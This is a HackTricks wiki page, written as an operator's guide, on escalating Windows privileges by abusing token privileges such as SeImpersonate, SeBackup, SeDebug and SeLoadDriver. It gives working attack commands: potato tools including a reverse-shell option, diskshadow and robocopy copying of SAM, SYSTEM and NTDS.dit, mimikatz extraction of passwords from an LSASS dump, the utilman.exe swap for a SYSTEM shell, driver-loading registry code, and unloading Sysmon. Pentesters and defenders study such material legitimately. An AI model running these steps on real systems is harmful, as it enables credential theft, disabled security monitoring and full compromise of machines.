---
title: "Abusing Tokens"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: windows
---

## Tokens

If you **don’t know what are Windows Access Tokens** read this page before continuing:

**You may be able to escalate privileges by abusing tokens you already hold.**

### SeImpersonatePrivilege

This privilege allows a process to impersonate (but not create) a token when it can obtain a handle to that token. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling execution of a process with SYSTEM privileges.<sup>[\[2\]](#references)</sup> This primitive can be exploited using tools such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (which requires WinRM to be disabled), [SweetPotato](https://github.com/CCob/SweetPotato), and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy** : on Windows 10 1809+/Server 2019+, prefer**GodPotato** ,**SigmaPotato** ,**PrintNotifyPotato** ,**RoguePotato** ,**SharpEfsPotato/EfsPotato** , or**PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or**`NETWORK SERVICE`** and`whoami /priv` shows a**filtered token** without`SeImpersonatePrivilege` /`SeAssignPrimaryTokenPrivilege` , recover the account’s**default privilege set** first (for example with**FullPowers** ) and retry the potato family afterwards.<sup>[\[3\]](#references)</sup>
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while**PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.

```
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
[RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.html)

### SeAssignPrimaryPrivilege

It is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token.

Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx).

With the token, you can create a **new process** with ‘CreateProcessAsUser’ or create a process suspended and **set the token** (in general, you cannot modify the primary token of a running process).[\[2\]](#references)

### SeTcbPrivilege

If you have enabled this token you can use **KERB_S4U_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** (admins) to the token, set the **integrity level** of the token to “**medium**”, and assign this token to the **current thread** (SetThreadToken).[\[2\]](#references)

### SeBackupPrivilege

The system is caused to **grant all read access** control to any file (limited to read operations) by this privilege. It is utilized for **reading the password hashes of local Administrator** accounts from the registry, following which, tools like “**psexec**” or “**wmiexec**” can be used with the hash (Pass-the-Hash technique). However, this technique fails under two conditions: when the Local Administrator account is disabled, or when a policy is in place that removes administrative rights from Local Administrators connecting remotely.[\[2\]](#references)

In practice, the most reliable built-in workflow is usually **VSS + `robocopy /b`**: create/expose a shadow copy, then copy `SAM`/`SYSTEM` or `NTDS.dit` in **backup mode**, which bypasses the file ACLs.[\[4\]](#references)

```
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:
:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in[https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:

### SeRestorePrivilege

Permission for **write access** to any system file, irrespective of the file’s Access Control List (ACL), is provided by this privilege. It opens up numerous possibilities for escalation, including the ability to **modify services**, perform DLL Hijacking, and set **debuggers** via Image File Execution Options among various other techniques.[\[2\]](#references)

### SeCreateTokenPrivilege

SeCreateTokenPrivilege is a powerful permission, especially useful when a user possesses the ability to impersonate tokens, but also in the absence of SeImpersonatePrivilege. This capability hinges on the ability to impersonate a token that represents the same user and whose integrity level does not exceed that of the current process.[\[2\]](#references)

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** It’s possible to leverage SeCreateTokenPrivilege for EoP by impersonating tokens under specific conditions.
- **Conditions for Token Impersonation:** Successful impersonation requires the target token to belong to the same user and have an integrity level that is less or equal to the integrity level of the process attempting impersonation.
- **Creation and Modification of Impersonation Tokens:** Users can create an impersonation token and enhance it by adding a privileged group’s SID (Security Identifier).

### SeLoadDriverPrivilege

This privilege allows a process to **load and unload device drivers** by creating a registry entry with specific `ImagePath` and `Type` values. Since direct write access to `HKLM` (HKEY_LOCAL_MACHINE) is restricted, `HKCU` (HKEY_CURRENT_USER) can be used instead. However, a specific path is required to make the `HKCU` entry recognizable to the kernel as a driver configuration.[\[2\]](#references)

Modern offensive use is usually **BYOVD** (bring your own vulnerable driver): load a **signed but vulnerable** kernel driver and then use its IOCTLs to disable protections or jump to kernel code execution. Keep in mind that on recent Windows 11/Server builds the **Microsoft vulnerable driver blocklist** and/or **HVCI/Memory Integrity** often break older public chains, so the classic `szkg64.sys`-style examples are no longer universally reliable.

This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Inside `HKCU`, this entire path must be created, and two values need to be set:[\[2\]](#references)

- `ImagePath` , which is the path to the binary to be executed
- `Type` , with a value of`SERVICE_KERNEL_DRIVER` (`0x00000001` ).

**Steps to Follow:**

1. Access `HKCU` instead of`HKLM` due to restricted write access.
2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` within`HKCU` , where`<RID>` represents the current user’s Relative Identifier.
3. Set the `ImagePath` to the binary’s execution path.
4. Assign the `Type` as`SERVICE_KERNEL_DRIVER` (`0x00000001` ).

```
# Example Python code to set the registry values
import winreg as reg
# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
More ways to abuse this privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

This is similar to **SeRestorePrivilege**. Its primary function allows a process to **assume ownership of an object**, circumventing the requirement for explicit discretionary access through the provision of WRITE_OWNER access rights. The process involves first securing ownership of the intended registry key for writing purposes, then altering the DACL to enable write operations.[\[2\]](#references)

```
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

This privilege permits the **debug other processes**, including to read and write in the memory. Various strategies for memory injection, capable of evading most antivirus and host intrusion prevention solutions, can be employed with this privilege.[\[2\]](#references)

On modern Windows, remember that `SeDebugPrivilege` is usually enough to open **non-protected SYSTEM processes** and duplicate their tokens, but it is **not** a guarantee that you can touch **LSASS**. If **RunAsPPL / LSA Protection** is enabled, non-protected processes cannot read or inject into LSASS even if `SeDebugPrivilege` is present. In that case, steal a token from another non-PPL SYSTEM process, or chain with a PPL bypass/BYOVD instead of assuming `procdump` will work. For a full token-copy example using `SeDebugPrivilege` + `SeImpersonatePrivilege`, check [this page](sedebug-+-seimpersonate-copy-token.html).

#### Dump memory

You could use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) to **capture the memory of a process**. Specifically, this can apply to the **Local Security Authority Subsystem Service (****LSASS****)** process, which is responsible for storing user credentials once a user has successfully logged into a system.

You can then load this dump in mimikatz to obtain passwords:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

If you want to get a `NT SYSTEM` shell you could use:

```
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

This right (Perform volume maintenance tasks) allows opening raw volume device handles (e.g., \.\C:) for direct disk I/O that bypasses NTFS ACLs. With it you can copy bytes of any file on the volume by reading the underlying blocks, enabling arbitrary file read of sensitive material (e.g., machine private keys in %ProgramData%\Microsoft\Crypto, registry hives, SAM/NTDS via VSS).<sup>[\[5\]](#references)</sup> It’s particularly impactful on CA servers where exfiltrating the CA private key enables forging a Golden Certificate to impersonate any principal.[\[6\]](#references)

See detailed techniques and mitigations:

[Semanagevolume Perform Volume Maintenance Tasks](semanagevolume-perform-volume-maintenance-tasks.html)

## Check privileges

```
whoami /priv
```
The **tokens that appear as Disabled** can usually be enabled, so you can often abuse both *Enabled* and *Disabled* privileges.

### Enable All the tokens

If you have disabled privileges, you can use the script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) to enable all the tokens:

```
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.[\[1\]](#references)

| Privilege | Impact | Tool | Execution path | Remarks |
|---|---|---|---|---|
| **`SeAssignPrimaryToken`** | ***Admin*** | 3rd party tool | *“It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe”* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
| **`SeBackup`** | **Threat** | ***Built-in commands*** | Read sensitive files with `robocopy /b` or dedicated SeBackup-aware copy helpers. | - Great for `SAM` /`SYSTEM` ,`SECURITY` ,`NTDS.dit` , and sometimes`%WINDIR%\MEMORY.DMP` . - `robocopy` is convenient, but dedicated SeBackup cmdlets/APIs are often more flexible for locked/open files. |
| **`SeCreateToken`** | ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken` . |  |
| **`SeDebug`** | ***Admin*** | **PowerShell** | Duplicate a **non-PPL** SYSTEM token or dump memory from a non-protected process. | LSASS dumping is commonly blocked if RunAsPPL/LSA Protection is enabled. Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
| **`SeImpersonate`** | ***Admin*** | 3rd party tool | Use the **Potato family** / named-pipe impersonation to spawn SYSTEM (`PrintSpoofer` ,`RoguePotato` ,`GodPotato` ,`SigmaPotato` ,`PrintNotifyPotato` , etc.). | Most practical from service accounts such as IIS APPPOOL, MSSQL, scheduled tasks, or any context that already owns `SeImpersonatePrivilege` . |
| **`SeLoadDriver`** | ***Admin*** | 3rd party tool | 1. Load a signed-but-vulnerable kernel driver (BYOVD) 2. Use the driver’s IOCTLs to get kernel R/W, disable security tooling, or elevate to SYSTEM Alternatively, the privilege may be used to unload security-related drivers with `fltMC` builtin command, i.e.`fltMC sysmondrv` | Older public drivers such as `szkg64.sys` are increasingly blocked on modern Windows by the vulnerable-driver blocklist / HVCI. |
| **`SeRestore`** | ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present. 2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) ). 3. Rename utilman.exe to utilman.old 4. Rename cmd.exe to utilman.exe 5. Lock the console and press Win+U | Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in “Program Files” using the same privilege |
| **`SeTakeOwnership`** | ***Admin*** | ***Built-in commands*** | 1. `takeown.exe /f “%windir%\system32”` 2. `icacls.exe “%windir%\system32” /grant “%username%”:F` 3. Rename cmd.exe to utilman.exe 4. Lock the console and press Win+U | Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in “Program Files” using the same privilege. |
| **`SeTcb`** | ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified. |  |

## References
